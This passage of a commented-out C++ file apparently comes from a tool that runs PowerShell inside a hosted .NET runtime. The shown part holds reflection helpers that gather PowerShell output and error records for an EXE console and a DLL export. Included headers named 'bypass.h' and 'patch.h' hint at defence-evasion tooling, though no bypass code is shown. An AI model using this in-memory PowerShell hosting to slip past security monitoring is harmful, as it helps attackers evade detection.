//#include "clr.h"
//#include "common.h"
//#include "patch.h"
//#include <stdio.h>
//#include <stdlib.h>
//#include <string>
//#include <iostream>
//#include <propvarutil.h>
//#include "bypass.h"
//
//// Helper functions
//BOOL System_Object_GetType(CLR& clr, VARIANT vtObject, VARIANT* pvtType) {
//    _Assembly* pAsm = NULL;
//    _Type* pObjectType = NULL;
//    _MethodInfo* pGetType = NULL;
//    VARIANT vtResult;
//    VariantInit(&vtResult);
//    BOOL bResult = FALSE;
//
//    if (!clr.LoadAssembly(L"System.Runtime", &pAsm)) {
//        wprintf(L"[!] Failed to load assembly\n");
//        return 0;
//    }
//
//    if (!clr.GetType(pAsm, L"System.Object", &pObjectType))
//        goto exit;
//
//    if (!clr.GetMethod(pObjectType, BindingFlags(BindingFlags_Public | BindingFlags_Instance), L"GetType", 0, &pGetType))
//        goto exit;
//
//    bResult = clr.InvokeMethod(pGetType, vtObject, NULL, &vtResult);
//
//    if (bResult) {
//        // VariantCopy addref COM object đúng cách, tránh leak refcount khi caller cũng Clear
//        HRESULT hr = VariantCopy(pvtType, &vtResult);
//        if (FAILED(hr)) bResult = FALSE;
//    }
//
//exit:
//    VariantClear(&vtResult);
//    if (pGetType) pGetType->Release();
//    if (pObjectType) pObjectType->Release();
//    if (pAsm) pAsm->Release();
//    return bResult;
//}
//
//BOOL System_Type_GetProperty(CLR& clr, VARIANT vtType, LPCWSTR pwszPropertyName, VARIANT* pvtPropertyInfo) {
//    _Assembly* pAsm = NULL;
//    _Type* pTypeType = NULL;
//    _MethodInfo* pGetProperty = NULL;
//    VARIANT vtPropName;
//    VariantInit(&vtPropName);
//    SAFEARRAY* pArgs = NULL;
//    VARIANT vtResult;
//    VariantInit(&vtResult);
//    long idx = 0;
//    BOOL bResult = FALSE;
//
//    if (!clr.LoadAssembly(L"System.Runtime", &pAsm)) {
//        wprintf(L"[!] Failed to load assembly\n");
//        return 0;
//    }
//
//    if (!clr.GetType(pAsm, L"System.Type", &pTypeType))
//        goto exit;
//
//    if (!clr.GetMethod(pTypeType, BindingFlags(BindingFlags_Public | BindingFlags_Instance), L"GetProperty", 1, &pGetProperty))
//        goto exit;
//
//    vtPropName.vt = VT_BSTR;
//    vtPropName.bstrVal = SysAllocString(pwszPropertyName);
//    if (!vtPropName.bstrVal) goto exit;
//
//    pArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
//    if (!pArgs) goto exit;
//    if (FAILED(SafeArrayPutElement(pArgs, &idx, &vtPropName))) goto exit;
//
//    bResult = clr.InvokeMethod(pGetProperty, vtType, pArgs, &vtResult);
//
//    if (bResult) {
//        HRESULT hr = VariantCopy(pvtPropertyInfo, &vtResult);
//        if (FAILED(hr)) bResult = FALSE;
//    }
//
//exit:
//    VariantClear(&vtResult);
//    if (pArgs) SafeArrayDestroy(pArgs);
//    VariantClear(&vtPropName);
//    if (pGetProperty) pGetProperty->Release();
//    if (pTypeType) pTypeType->Release();
//    if (pAsm) pAsm->Release();
//    return bResult;
//}
//
//BOOL System_Reflection_PropertyInfo_GetValue(CLR& clr, VARIANT vtPropertyInfo, VARIANT vtObject, SAFEARRAY* pIndex, VARIANT* pvtValue) {
//    _Assembly* pAsm = NULL;
//    _Type* pPropertyInfoType = NULL;
//    _MethodInfo* pGetValue = NULL;
//    SAFEARRAY* pArgs = NULL;
//    LONG lNbArguments = pIndex != NULL ? 2 : 1;
//    int argCount = lNbArguments;
//    long idx = 0;
//    VARIANT vtIndexArray;
//    VariantInit(&vtIndexArray);
//    VARIANT vtResult;
//    VariantInit(&vtResult);
//    BOOL bResult = FALSE;
//
//    if (!clr.LoadAssembly(L"System.Reflection", &pAsm)) {
//        wprintf(L"[!] Failed to load assembly\n");
//        return 0;
//    }
//
//    if (!clr.GetType(pAsm, L"System.Reflection.PropertyInfo", &pPropertyInfoType))
//        goto exit;
//
//    if (!clr.GetMethod(pPropertyInfoType, BindingFlags(BindingFlags_Public | BindingFlags_Instance), L"GetValue", lNbArguments, &pGetValue))
//        goto exit;
//
//    pArgs = SafeArrayCreateVector(VT_VARIANT, 0, argCount);
//    if (!pArgs) goto exit;
//    if (FAILED(SafeArrayPutElement(pArgs, &idx, &vtObject))) goto exit;
//
//    if (pIndex != NULL) {
//        vtIndexArray.vt = VT_ARRAY | VT_VARIANT;
//        vtIndexArray.parray = pIndex;
//        idx = 1;
//        if (FAILED(SafeArrayPutElement(pArgs, &idx, &vtIndexArray))) goto exit;
//        // vtIndexArray chỉ là wrapper quanh pIndex do caller sở hữu; không VariantClear ở đây
//    }
//
//    bResult = clr.InvokeMethod(pGetValue, vtPropertyInfo, pArgs, &vtResult);
//
//    if (bResult) {
//        HRESULT hr = VariantCopy(pvtValue, &vtResult);
//        if (FAILED(hr)) bResult = FALSE;
//    }
//
//exit:
//    VariantClear(&vtResult);
//    if (pArgs) SafeArrayDestroy(pArgs);
//    if (pGetValue) pGetValue->Release();
//    if (pPropertyInfoType) pPropertyInfoType->Release();
//    if (pAsm) pAsm->Release();
//    return bResult;
//}
//
//BOOL System_Reflection_PropertyInfo_GetValue(CLR& clr, VARIANT vtPropertyInfo, VARIANT vtObject, VARIANT* pvtValue) {
//    return System_Reflection_PropertyInfo_GetValue(clr, vtPropertyInfo, vtObject, NULL, pvtValue);
//}
//
//// Main print function
//// Collect PSDataCollection<PSObject> → std::wstring (mỗi item ToString nối tiếp).
//// Dùng chung cho REPL (sau đó in ra stdout) và DLL (convert sang BSTR).
//void CollectOutput(CLR& clr, VARIANT vtResult, std::wstring* pOut) {
//    VARIANT vtResultType = { 0 };
//    VARIANT vtCountProperty = { 0 };
//    VARIANT vtCount = { 0 };
//    VARIANT vtItemProperty = { 0 };
//    VARIANT vtValue = { 0 };
//    VARIANT vtValueAsString = { 0 };
//    SAFEARRAY* pIndex = NULL;
//    _Type* pPSObjectType = NULL;
//    _MethodInfo* pToString = NULL;
//    _Assembly* pAsm = NULL;
//
//    if (!System_Object_GetType(clr, vtResult, &vtResultType))
//        goto exit;
//
//    if (!System_Type_GetProperty(clr, vtResultType, L"Count", &vtCountProperty))
//        goto exit;
//
//    if (!System_Reflection_PropertyInfo_GetValue(clr, vtCountProperty, vtResult, &vtCount))
//        goto exit;
//
//    if (!System_Type_GetProperty(clr, vtResultType, L"Item", &vtItemProperty))
//        goto exit;
//
//    if (clr.LoadAssembly(L"System.Management.Automation", &pAsm)) {
//        BSTR bstrTypeName = SysAllocString(L"System.Management.Automation.PSObject");
//        if (bstrTypeName) {
//            pAsm->GetType_2(bstrTypeName, &pPSObjectType);
//            SysFreeString(bstrTypeName);
//        }
//        pAsm->Release();
//        pAsm = NULL;
//    }
//
//    if (pPSObjectType) {
//        if (!clr.GetMethod(pPSObjectType, BindingFlags(BindingFlags_Public | BindingFlags_Instance), L"ToString", 0, &pToString))
//            pToString = NULL;
//    }
//
//    if (vtCount.vt == VT_I4 && vtCount.intVal > 0) {
//        for (int i = 0; i < vtCount.intVal; i++) {
//            VARIANT vtIndex;
//            vtIndex.vt = VT_I4;
//            vtIndex.intVal = i;
//
//            pIndex = SafeArrayCreateVector(VT_VARIANT, 0, 1);
//            long idx = 0;
//            if (pIndex) {
//                if (FAILED(SafeArrayPutElement(pIndex, &idx, &vtIndex))) {
//                    SafeArrayDestroy(pIndex);
//                    pIndex = NULL;
//                }
//            }
//
//            if (pIndex && System_Reflection_PropertyInfo_GetValue(clr, vtItemProperty, vtResult, pIndex, &vtValue)) {
//                VariantInit(&vtValueAsString);
//                if (pToString && clr.InvokeMethod(pToString, vtValue, NULL, &vtValueAsString)) {
//                    if (vtValueAsString.vt == VT_BSTR && vtValueAsString.bstrVal) {
//                        if (pOut) {
//                            *pOut += vtValueAsString.bstrVal;
//                        }
//                        else {
//                            wprintf(L"%ws", vtValueAsString.bstrVal);
//                        }
//                    }
//                }
//                VariantClear(&vtValueAsString);
//                VariantClear(&vtValue);
//            }
//
//            SafeArrayDestroy(pIndex);
//            pIndex = NULL;
//        }
//    }
//
//exit:
//    if (pIndex) SafeArrayDestroy(pIndex);
//    if (pToString) pToString->Release();
//    if (pPSObjectType) pPSObjectType->Release();
//    if (pAsm) pAsm->Release();
//
//    VariantClear(&vtValueAsString);
//    VariantClear(&vtValue);
//    VariantClear(&vtItemProperty);
//    VariantClear(&vtCountProperty);
//    VariantClear(&vtCount);
//    VariantClear(&vtResultType);
//}
//
//// REPL wrapper: collect rồi in ra stdout.
//void PrintPowerShellOutput(CLR& clr, VARIANT vtResult) {
//    CollectOutput(clr, vtResult, NULL);
//}
//
//BOOL PowerShellGetStream(CLR& clr, VARIANT vtPowerShellInstance, LPCWSTR pwszStreamName, VARIANT* pvtStream)
//{
//    BOOL bResult = FALSE;
//    VARIANT vtStreams = { 0 };
//    VARIANT vtStream = { 0 };
//    _Type* pPowerShellType = NULL;
//    _Type* pPSDataStreamsType = NULL;
//    _Assembly* pAsm = NULL;
//
//    if (!clr.LoadAssembly(L"System.Management.Automation", &pAsm)) {
//        goto exit;
//    }
//
//    if (!clr.GetType(pAsm, L"System.Management.Automation.PowerShell", &pPowerShellType))
//        goto exit;
//
//    if (!clr.GetPropertyValue(pPowerShellType, BindingFlags(BindingFlags_Public | BindingFlags_Instance), vtPowerShellInstance, L"Streams", &vtStreams))
//        goto exit;
//
//    if (!clr.GetType(pAsm, L"System.Management.Automation.PSDataStreams", &pPSDataStreamsType))
//        goto exit;
//
//    if (!clr.GetPropertyValue(pPSDataStreamsType, BindingFlags(BindingFlags_Public | BindingFlags_Instance), vtStreams, pwszStreamName, &vtStream))
//        goto exit;
//
//    // VariantCopy addref COM object đúng cách
//    if (FAILED(VariantCopy(pvtStream, &vtStream))) goto exit;
//    bResult = TRUE;
//
//exit:
//    VariantClear(&vtStream);
//    VariantClear(&vtStreams);
//    if (pPSDataStreamsType) pPSDataStreamsType->Release();
//    if (pPowerShellType) pPowerShellType->Release();
//    if (pAsm) pAsm->Release();
//
//    return bResult;
//}
//
//void PrintErrorRecord(CLR& clr, VARIANT vtErrorRecord)
//{
//    WORD wOldColor = 0;
//    size_t sScriptStackTraceLen;
//    VARIANT vtErrorRecordType = { 0 };
//    VARIANT vtTargetObjectProperty = { 0 };
//    VARIANT vtTargetObject = { 0 };
//    VARIANT vtScriptStackTraceProperty = { 0 };
//    VARIANT vtScriptStackTrace = { 0 };
//    VARIANT vtCategoryInfoProperty = { 0 };
//    VARIANT vtCategoryInfo = { 0 };
//    VARIANT vtCategoryInfoMessage = { 0 };
//    VARIANT vtFullyQualifiedErrorIdProperty = { 0 };
//    VARIANT vtFullyQualifiedErrorId = { 0 };
//    VARIANT vtExceptionProperty = { 0 };
//    VARIANT vtException = { 0 };
//    VARIANT vtExceptionType = { 0 };
//    VARIANT vtExceptionMessageProperty = { 0 };
//    VARIANT vtExceptionMessage = { 0 };
//    _Type* pErrorCategoryInfoType = NULL;
//    _MethodInfo* pErrorCategoryInfoGetMessageMethodInfo = NULL;
//    _Assembly* pAsm = NULL;
//
//    if (!clr.LoadAssembly(L"System.Management.Automation", &pAsm)) {
//        goto exit;
//    }
//
//    if (!System_Object_GetType(clr, vtErrorRecord, &vtErrorRecordType))
//        goto exit;
//
//    if (!System_Type_GetProperty(clr, vtErrorRecordType, L"TargetObject", &vtTargetObjectProperty))
//        goto exit;
//
//    if (!System_Reflection_PropertyInfo_GetValue(clr, vtTargetObjectProperty, vtErrorRecord, &vtTargetObject))
//        goto exit;
//
//    if (!System_Type_GetProperty(clr, vtErrorRecordType, L"ScriptStackTrace", &vtScriptStackTraceProperty))
//        goto exit;
//
//    if (!System_Reflection_PropertyInfo_GetValue(clr, vtScriptStackTraceProperty, vtErrorRecord, &vtScriptStackTrace))
//        goto exit;
//
//    if (!System_Type_GetProperty(clr, vtErrorRecordType, L"CategoryInfo", &vtCategoryInfoProperty))
//        goto exit;
//
//    if (!System_Reflection_PropertyInfo_GetValue(clr, vtCategoryInfoProperty, vtErrorRecord, &vtCategoryInfo))
//        goto exit;
//
//    if (!clr.GetType(pAsm, L"System.Management.Automation.ErrorCategoryInfo", &pErrorCategoryInfoType))
//        goto exit;
//
//    if (!clr.GetMethod(pErrorCategoryInfoType, BindingFlags(BindingFlags_Public | BindingFlags_Instance), L"GetMessage", 0, &pErrorCategoryInfoGetMessageMethodInfo))
//        goto exit;
//
//    if (!clr.InvokeMethod(pErrorCategoryInfoGetMessageMethodInfo, vtCategoryInfo, NULL, &vtCategoryInfoMessage))
//        goto exit;
//
//    if (!System_Type_GetProperty(clr, vtErrorRecordType, L"FullyQualifiedErrorId", &vtFullyQualifiedErrorIdProperty))
//        goto exit;
//
//    if (!System_Reflection_PropertyInfo_GetValue(clr, vtFullyQualifiedErrorIdProperty, vtErrorRecord, &vtFullyQualifiedErrorId))
//        goto exit;
//
//    if (!System_Type_GetProperty(clr, vtErrorRecordType, L"Exception", &vtExceptionProperty))
//        goto exit;
//
//    if (!System_Reflection_PropertyInfo_GetValue(clr, vtExceptionProperty, vtErrorRecord, &vtException))
//        goto exit;
//
//    if (!System_Object_GetType(clr, vtException, &vtExceptionType))
//        goto exit;
//
//    if (!System_Type_GetProperty(clr, vtExceptionType, L"Message", &vtExceptionMessageProperty))
//        goto exit;
//
//    if (!System_Reflection_PropertyInfo_GetValue(clr, vtExceptionMessageProperty, vtException, &vtExceptionMessage))
//        goto exit;
//
//    //SetConsoleTextColor(FOREGROUND_RED | FOREGROUND_INTENSITY, &wOldColor);
//
//    if (vtTargetObject.vt == VT_BSTR && vtExceptionMessage.vt == VT_BSTR)
//    {
//        wprintf(L"%ws : %ws\n", vtTargetObject.bstrVal, vtExceptionMessage.bstrVal);
//    }
//    else if (vtTargetObject.vt != VT_BSTR && vtExceptionMessage.vt == VT_BSTR)
//    {
//        wprintf(L". : %ws\n", vtExceptionMessage.bstrVal);
//    }
//
//    if (vtScriptStackTrace.vt == VT_BSTR)
//    {
//        wprintf(L"%ws\n", vtScriptStackTrace.bstrVal);
//    }
//
//    if (vtTargetObject.vt == VT_BSTR && vtTargetObject.bstrVal)
//    {
//        sScriptStackTraceLen = wcslen(vtTargetObject.bstrVal);
//        wprintf(L"+ %ws\n", vtTargetObject.bstrVal);
//        wprintf(L"+ ");
//        for (size_t i = 0; i < sScriptStackTraceLen; i++) { wprintf(L"%ws", L"~"); }
//        wprintf(L"\n");
//    }
//
//    if (vtCategoryInfoMessage.vt == VT_BSTR)
//    {
//        wprintf(L"    + CategoryInfo           : %ws\n", vtCategoryInfoMessage.bstrVal);
//    }
//
//    if (vtFullyQualifiedErrorId.vt == VT_BSTR)
//    {
//        wprintf(L"    + FullyQualifiedErrorId  : %ws\n", vtFullyQualifiedErrorId.bstrVal);
//    }
//
//    if (wOldColor != 0)
//    {
//        //SetConsoleTextColor(wOldColor, NULL);
//    }
//
//    wprintf(L"\n");
//
//exit:
//    if (pErrorCategoryInfoGetMessageMethodInfo) pErrorCategoryInfoGetMessageMethodInfo->Release();
//    if (pErrorCategoryInfoType) pErrorCategoryInfoType->Release();
//    if (pAsm) pAsm->Release();
//
//    VariantClear(&vtExceptionMessage);
//    VariantClear(&vtExceptionMessageProperty);
//    VariantClear(&vtExceptionType);
//    VariantClear(&vtException);
//    VariantClear(&vtExceptionProperty);
//    VariantClear(&vtFullyQualifiedErrorId);
//    VariantClear(&vtFullyQualifiedErrorIdProperty);
//    VariantClear(&vtCategoryInfoMessage);
//    VariantClear(&vtCategoryInfo);
//    VariantClear(&vtCategoryInfoProperty);
//    VariantClear(&vtScriptStackTrace);
//    VariantClear(&vtScriptStackTraceProperty);
//    VariantClear(&vtTargetObject);
//    VariantClear(&vtTargetObjectProperty);
//    VariantClear(&vtErrorRecordType);
//}
//
//void PrintPowerShellErrorStream(CLR& clr, VARIANT vtErrorStream)
//{
//    LONG lArgumentIndex;
//    VARIANT vtPSDataCollectionType = { 0 };
//    VARIANT vtPSDataCollectionCountProperty = { 0 };
//    VARIANT vtErrorStreamCount = { 0 };
//    VARIANT vtPSDataCollectionItemProperty = { 0 };
//    VARIANT vtIndex = { 0 };
//    VARIANT vtErrorRecord = { 0 };
//    SAFEARRAY* pIndex = NULL;
//    _Assembly* pAsm = NULL;
//
//    if (!clr.LoadAssembly(L"System.Management.Automation", &pAsm)) {
//        goto exit;
//    }
//
//    if (!System_Object_GetType(clr, vtErrorStream, &vtPSDataCollectionType))
//        goto exit;
//
//    if (!System_Type_GetProperty(clr, vtPSDataCollectionType, L"Count", &vtPSDataCollectionCountProperty))
//        goto exit;
//
//    if (!System_Reflection_PropertyInfo_GetValue(clr, vtPSDataCollectionCountProperty, vtErrorStream, &vtErrorStreamCount))
//        goto exit;
//
//    if (!System_Type_GetProperty(clr, vtPSDataCollectionType, L"Item", &vtPSDataCollectionItemProperty))
//        goto exit;
//
//    if (vtErrorStreamCount.vt == VT_I4 && vtErrorStreamCount.lVal > 0)
//    {
//        for (LONG i = 0; i < vtErrorStreamCount.lVal; i++)
//        {
//            InitVariantFromInt32(i, &vtIndex);
//            pIndex = SafeArrayCreateVector(VT_VARIANT, 0, 1);
//            lArgumentIndex = 0;
//            if (pIndex) {
//                if (FAILED(SafeArrayPutElement(pIndex, &lArgumentIndex, &vtIndex))) {
//                    SafeArrayDestroy(pIndex);
//                    pIndex = NULL;
//                }
//            }
//
//            if (pIndex && System_Reflection_PropertyInfo_GetValue(clr, vtPSDataCollectionItemProperty, vtErrorStream, pIndex, &vtErrorRecord))
//            {
//                PrintErrorRecord(clr, vtErrorRecord);
//                VariantClear(&vtErrorRecord);
//            }
//
//            SafeArrayDestroy(pIndex);
//            pIndex = NULL;
//            VariantClear(&vtIndex);
//        }
//    }
//
//exit:
//    if (pIndex) SafeArrayDestroy(pIndex);
//    if (pAsm) pAsm->Release();
//
//    VariantClear(&vtErrorStreamCount);
//    VariantClear(&vtIndex);
//    VariantClear(&vtPSDataCollectionItemProperty);
//    VariantClear(&vtPSDataCollectionCountProperty);
//    VariantClear(&vtPSDataCollectionType);
//}
//
//void PrintPowerShellInvocationStateInfoReason(CLR& clr, VARIANT vtReason)
//{
//    WORD wOldColor = 0;
//    VARIANT vtExceptionAsString = { 0 };
//    _Type* pExceptionType = NULL;
//    _MethodInfo* pToStringMethod = NULL;
//    _Assembly* pAsm = NULL;
//
//    if (!clr.LoadAssembly(L"System.Runtime", &pAsm)) {
//        goto exit;
//    }
//
//    if (!clr.GetType(pAsm, L"System.Exception", &pExceptionType))
//        goto exit;
//
//    if (!clr.GetMethod(pExceptionType, BindingFlags(BindingFlags_Public | BindingFlags_Instance), L"ToString", 0, &pToStringMethod))
//        goto exit;
//
//    if (!clr.InvokeMethod(pToStringMethod, vtReason, NULL, &vtExceptionAsString))
//        goto exit;
//
//    if (vtExceptionAsString.vt == VT_BSTR && vtExceptionAsString.bstrVal && wcslen(vtExceptionAsString.bstrVal) > 0)
//    {
//        //PRINT_ERROR("An exception was thrown while executing the input script.\n\n");
//
//        //SetConsoleTextColor(FOREGROUND_RED | FOREGROUND_INTENSITY, &wOldColor);
//
//        wprintf(L"%ws\n\n", vtExceptionAsString.bstrVal);
//
//        if (wOldColor != 0)
//        {
//            //SetConsoleTextColor(wOldColor, NULL);
//        }
//    }
//
//exit:
//    if (pToStringMethod) pToStringMethod->Release();
//    if (pExceptionType) pExceptionType->Release();
//    if (pAsm) pAsm->Release();
//
//    VariantClear(&vtExceptionAsString);
//}
//
//void PrintPowerShellInvokeErrors(CLR& clr, VARIANT vtPowerShellInstance)
//{
//    VARIANT vtErrorStream = { 0 };
//    VARIANT vtInvocationStateInfo = { 0 };
//    VARIANT vtReason = { 0 };
//    _Type* pPowerShellType = NULL;
//    _Type* pPSInvocationStateInfoType = NULL;
//    _Assembly* pAsm = NULL;
//
//    if (!clr.LoadAssembly(L"System.Management.Automation", &pAsm)) {
//        goto exit;
//    }
//
//    if (!clr.GetType(pAsm, L"System.Management.Automation.PowerShell", &pPowerShellType))
//        goto exit;
//
//    if (!PowerShellGetStream(clr, vtPowerShellInstance, L"Error", &vtErrorStream))
//        goto exit;
//
//    if (vtErrorStream.vt != VT_EMPTY)
//    {
//        PrintPowerShellErrorStream(clr, vtErrorStream);
//    }
//
//    if (!clr.GetPropertyValue(pPowerShellType, BindingFlags(BindingFlags_Public | BindingFlags_Instance), vtPowerShellInstance, L"InvocationStateInfo", &vtInvocationStateInfo))
//        goto exit;
//
//    if (!clr.GetType(pAsm, L"System.Management.Automation.PSInvocationStateInfo", &pPSInvocationStateInfoType))
//        goto exit;
//
//    if (!clr.GetPropertyValue(pPSInvocationStateInfoType, BindingFlags(BindingFlags_Public | BindingFlags_Instance), vtInvocationStateInfo, L"Reason", &vtReason))
//        goto exit;
//
//    if (vtReason.vt != VT_EMPTY)
//    {
//        PrintPowerShellInvocationStateInfoReason(clr, vtReason);
//    }
//
//exit:
//    if (pPSInvocationStateInfoType) pPSInvocationStateInfoType->Release();
//    if (pPowerShellType) pPowerShellType->Release();
//    if (pAsm) pAsm->Release();
//
//    VariantClear(&vtReason);
//    VariantClear(&vtInvocationStateInfo);
//    VariantClear(&vtErrorStream);
//}
//
//void ClearStreamErrors(CLR& clr, VARIANT vtPowerShellInstance) {
//    //pass
//    (void)clr; (void)vtPowerShellInstance;
//}
//
//// =====================================================================
//// Collect* helpers — mirror của Print* helpers trong EXE build.
//// Cùng logic reflection, nhưng append output vào std::wstring thay vì wprintf.
//// Dùng bởi DLL PS_Execute() để merge errors vào BSTR trả về.
//// =====================================================================
//
//// Mirror PrintErrorRecord (line ~287).
//void CollectErrorRecord(CLR& clr, VARIANT vtErrorRecord, std::wstring* pOut)
//{
//    VARIANT vtErrorRecordType = { 0 };
//    VARIANT vtTargetObjectProperty = { 0 };
//    VARIANT vtTargetObject = { 0 };
//    VARIANT vtScriptStackTraceProperty = { 0 };
//    VARIANT vtScriptStackTrace = { 0 };
//    VARIANT vtCategoryInfoProperty = { 0 };
//    VARIANT vtCategoryInfo = { 0 };
//    VARIANT vtCategoryInfoMessage = { 0 };
//    VARIANT vtFullyQualifiedErrorIdProperty = { 0 };
//    VARIANT vtFullyQualifiedErrorId = { 0 };
//    VARIANT vtExceptionProperty = { 0 };
//    VARIANT vtException = { 0 };
//    VARIANT vtExceptionType = { 0 };
//    VARIANT vtExceptionMessageProperty = { 0 };
//    VARIANT vtExceptionMessage = { 0 };
//    _Type* pErrorCategoryInfoType = NULL;
//    _MethodInfo* pErrorCategoryInfoGetMessageMethodInfo = NULL;
//    _Assembly* pAsm = NULL;
//    wchar_t buf[1024];
//
//    if (!clr.LoadAssembly(L"System.Management.Automation", &pAsm)) goto exit;
//
//    if (!System_Object_GetType(clr, vtErrorRecord, &vtErrorRecordType)) goto exit;
//    if (!System_Type_GetProperty(clr, vtErrorRecordType, L"TargetObject", &vtTargetObjectProperty)) goto exit;
//    if (!System_Reflection_PropertyInfo_GetValue(clr, vtTargetObjectProperty, vtErrorRecord, &vtTargetObject)) goto exit;
//    if (!System_Type_GetProperty(clr, vtErrorRecordType, L"ScriptStackTrace", &vtScriptStackTraceProperty)) goto exit;
//    if (!System_Reflection_PropertyInfo_GetValue(clr, vtScriptStackTraceProperty, vtErrorRecord, &vtScriptStackTrace)) goto exit;
//    if (!System_Type_GetProperty(clr, vtErrorRecordType, L"CategoryInfo", &vtCategoryInfoProperty)) goto exit;
//    if (!System_Reflection_PropertyInfo_GetValue(clr, vtCategoryInfoProperty, vtErrorRecord, &vtCategoryInfo)) goto exit;
//    if (!clr.GetType(pAsm, L"System.Management.Automation.ErrorCategoryInfo", &pErrorCategoryInfoType)) goto exit;
//    if (!clr.GetMethod(pErrorCategoryInfoType, BindingFlags(BindingFlags_Public | BindingFlags_Instance), L"GetMessage", 0, &pErrorCategoryInfoGetMessageMethodInfo)) goto exit;
//    if (!clr.InvokeMethod(pErrorCategoryInfoGetMessageMethodInfo, vtCategoryInfo, NULL, &vtCategoryInfoMessage)) goto exit;
//    if (!System_Type_GetProperty(clr, vtErrorRecordType, L"FullyQualifiedErrorId", &vtFullyQualifiedErrorIdProperty)) goto exit;
//    if (!System_Reflection_PropertyInfo_GetValue(clr, vtFullyQualifiedErrorIdProperty, vtErrorRecord, &vtFullyQualifiedErrorId)) goto exit;
//    if (!System_Type_GetProperty(clr, vtErrorRecordType, L"Exception", &vtExceptionProperty)) goto exit;
//    if (!System_Reflection_PropertyInfo_GetValue(clr, vtExceptionProperty, vtErrorRecord, &vtException)) goto exit;
//    if (!System_Object_GetType(clr, vtException, &vtExceptionType)) goto exit;
//    if (!System_Type_GetProperty(clr, vtExceptionType, L"Message", &vtExceptionMessageProperty)) goto exit;
//    if (!System_Reflection_PropertyInfo_GetValue(clr, vtExceptionMessageProperty, vtException, &vtExceptionMessage)) goto exit;
//
//    if (vtTargetObject.vt == VT_BSTR && vtExceptionMessage.vt == VT_BSTR)
//        swprintf_s(buf, 1024, L"%ws : %ws\n", vtTargetObject.bstrVal, vtExceptionMessage.bstrVal);
//    else if (vtTargetObject.vt != VT_BSTR && vtExceptionMessage.vt == VT_BSTR)
//        swprintf_s(buf, 1024, L". : %ws\n", vtExceptionMessage.bstrVal);
//    else
//        buf[0] = 0;
//    *pOut += buf;
//
//    if (vtScriptStackTrace.vt == VT_BSTR && vtScriptStackTrace.bstrVal) {
//        *pOut += std::wstring(vtScriptStackTrace.bstrVal) + L"\n";
//    }
//
//    if (vtTargetObject.vt == VT_BSTR && vtTargetObject.bstrVal) {
//        size_t n = wcslen(vtTargetObject.bstrVal);
//        *pOut += std::wstring(L"+ ") + vtTargetObject.bstrVal + L"\n+ ";
//        for (size_t i = 0; i < n; i++) *pOut += L"~";
//        *pOut += L"\n";
//    }
//
//    if (vtCategoryInfoMessage.vt == VT_BSTR && vtCategoryInfoMessage.bstrVal) {
//        *pOut += std::wstring(L"    + CategoryInfo          : ") + vtCategoryInfoMessage.bstrVal + L"\n";
//    }
//    if (vtFullyQualifiedErrorId.vt == VT_BSTR && vtFullyQualifiedErrorId.bstrVal) {
//        *pOut += std::wstring(L"    + FullyQualifiedErrorId : ") + vtFullyQualifiedErrorId.bstrVal + L"\n";
//    }
//
//exit:
//    if (pErrorCategoryInfoGetMessageMethodInfo) pErrorCategoryInfoGetMessageMethodInfo->Release();
//    if (pErrorCategoryInfoType) pErrorCategoryInfoType->Release();
//    if (pAsm) pAsm->Release();
//    VariantClear(&vtExceptionMessage);
//    VariantClear(&vtExceptionMessageProperty);
//    VariantClear(&vtExceptionType);
//    VariantClear(&vtException);
//    VariantClear(&vtExceptionProperty);
//    VariantClear(&vtFullyQualifiedErrorId);
//    VariantClear(&vtFullyQualifiedErrorIdProperty);
//    VariantClear(&vtCategoryInfoMessage);
//    VariantClear(&vtCategoryInfo);
//    VariantClear(&vtCategoryInfoProperty);
//    VariantClear(&vtScriptStackTrace);
//    VariantClear(&vtScriptStackTraceProperty);
//    VariantClear(&vtTargetObject);
//    VariantClear(&vtTargetObjectProperty);
//    VariantClear(&vtErrorRecordType);
//}
//
//// Mirror PrintPowerShellErrorStream (line ~429).
//void CollectPowerShellErrorStream(CLR& clr, VARIANT vtErrorStream, std::wstring* pOut)
//{
//    LONG lArgumentIndex;
//    VARIANT vtPSDataCollectionType = { 0 };
//    VARIANT vtPSDataCollectionCountProperty = { 0 };
//    VARIANT vtErrorStreamCount = { 0 };
//    VARIANT vtPSDataCollectionItemProperty = { 0 };
//    VARIANT vtIndex = { 0 };
//    VARIANT vtErrorRecord = { 0 };
//    SAFEARRAY* pIndex = NULL;
//
//    if (!System_Object_GetType(clr, vtErrorStream, &vtPSDataCollectionType)) goto exit;
//    if (!System_Type_GetProperty(clr, vtPSDataCollectionType, L"Count", &vtPSDataCollectionCountProperty)) goto exit;
//    if (!System_Reflection_PropertyInfo_GetValue(clr, vtPSDataCollectionCountProperty, vtErrorStream, &vtErrorStreamCount)) goto exit;
//    if (!System_Type_GetProperty(clr, vtPSDataCollectionType, L"Item", &vtPSDataCollectionItemProperty)) goto exit;
//
//    if (vtErrorStreamCount.vt == VT_I4 && vtErrorStreamCount.lVal > 0) {
//        for (LONG i = 0; i < vtErrorStreamCount.lVal; i++) {
//            InitVariantFromInt32(i, &vtIndex);
//            pIndex = SafeArrayCreateVector(VT_VARIANT, 0, 1);
//            lArgumentIndex = 0;
//            if (pIndex) {
//                if (FAILED(SafeArrayPutElement(pIndex, &lArgumentIndex, &vtIndex))) {
//                    SafeArrayDestroy(pIndex);
//                    pIndex = NULL;
//                }
//            }
//            if (pIndex && System_Reflection_PropertyInfo_GetValue(clr, vtPSDataCollectionItemProperty, vtErrorStream, pIndex, &vtErrorRecord)) {
//                CollectErrorRecord(clr, vtErrorRecord, pOut);
//                VariantClear(&vtErrorRecord);
//            }
//            SafeArrayDestroy(pIndex);
//            pIndex = NULL;
//            VariantClear(&vtIndex);
//        }
//    }
//
//exit:
//    if (pIndex) SafeArrayDestroy(pIndex);
//    VariantClear(&vtErrorStreamCount);
//    VariantClear(&vtIndex);
//    VariantClear(&vtPSDataCollectionItemProperty);
//    VariantClear(&vtPSDataCollectionCountProperty);
//    VariantClear(&vtPSDataCollectionType);
//    VariantClear(&vtErrorRecord);
//}
//
//// Mirror PrintPowerShellInvocationStateInfoReason (line ~494).
//void CollectPowerShellInvocationStateInfoReason(CLR& clr, VARIANT vtReason, std::wstring* pOut)
//{
//    VARIANT vtExceptionAsString = { 0 };
//    _Type* pExceptionType = NULL;
//    _MethodInfo* pToStringMethod = NULL;
//    _Assembly* pAsm = NULL;
//
//    if (!clr.LoadAssembly(L"System.Runtime", &pAsm)) goto exit;
//    if (!clr.GetType(pAsm, L"System.Exception", &pExceptionType)) goto exit;
